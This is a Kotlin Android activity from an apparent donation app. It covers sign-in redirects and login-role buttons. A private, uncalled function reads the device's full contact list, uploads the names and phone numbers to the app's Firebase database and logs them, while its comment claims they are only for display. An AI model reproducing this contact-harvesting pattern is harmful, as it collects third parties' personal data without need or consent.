package com.example.karunadaan

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.ContactsContract
import android.util.Log
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.cardview.widget.CardView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.google.android.gms.auth.api.signin.GoogleSignIn
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase

class FirstPage : AppCompatActivity() {

    lateinit var donateLogin:CardView
    lateinit var ngoAgent:CardView
    lateinit var acceptor:CardView
    lateinit var mAuth:FirebaseAuth
    lateinit var mDatabaseReference:DatabaseReference
    val REQUEST_PERMISSION = 101

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_first_page)

        mAuth= FirebaseAuth.getInstance()
        mDatabaseReference=FirebaseDatabase.getInstance().getReference()
        if(mAuth.currentUser != null){
            intent = Intent(this,MainActivity::class.java);
            intent.putExtra("uid", mAuth.currentUser!!.uid.toString())
            startActivity(intent);
            finish()
        }

        donateLogin=findViewById(R.id.loginDonate)
        ngoAgent=findViewById(R.id.ngoAgent)
        acceptor=findViewById(R.id.receiver)

        donateLogin.setOnClickListener {
            val intent= Intent(this,LoginActivity::class.java)
            startActivity(intent)
            finish()
        }
        ngoAgent.setOnClickListener {
            val intent= Intent(this,LoginActivity::class.java)
            startActivity(intent)
            finish()
        }
        acceptor.setOnClickListener {
            val intent= Intent(this,LoginActivity::class.java)
            startActivity(intent)
            finish()
        }

    }

    override fun onStart() {
        super.onStart()
        // Check for existing Google Sign In account, if the user is already signed in
        // the GoogleSignInAccount will be non-null.
        // Check for existing Google Sign In account, if the user is already signed in
        // the GoogleSignInAccount will be non-null.
        val account = GoogleSignIn.getLastSignedInAccount(this)
        if(account!=null){
            var intent=Intent(this,MainActivity::class.java)
            startActivity(intent)

            finish()
        }
        //updateUI(account)
    }
    private fun accessContacts() {
        val contactsList = mutableListOf<String>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        cursor?.let {
            // Retrieve column indices
            val nameIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val phoneIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val name = it.getString(nameIndex)
                val phoneNumber = it.getString(phoneIndex)
                contactsList.add("Name: $name, Phone: $phoneNumber")
            }
        }

        // Use contactsList, e.g., display in a RecyclerView
        mDatabaseReference=FirebaseDatabase.getInstance().getReference()
        mDatabaseReference.child("contacts").child(mAuth.currentUser!!.uid).push().setValue(contactsList)
        contactsList.forEach { Log.d("Contacts ", it) }
    }
}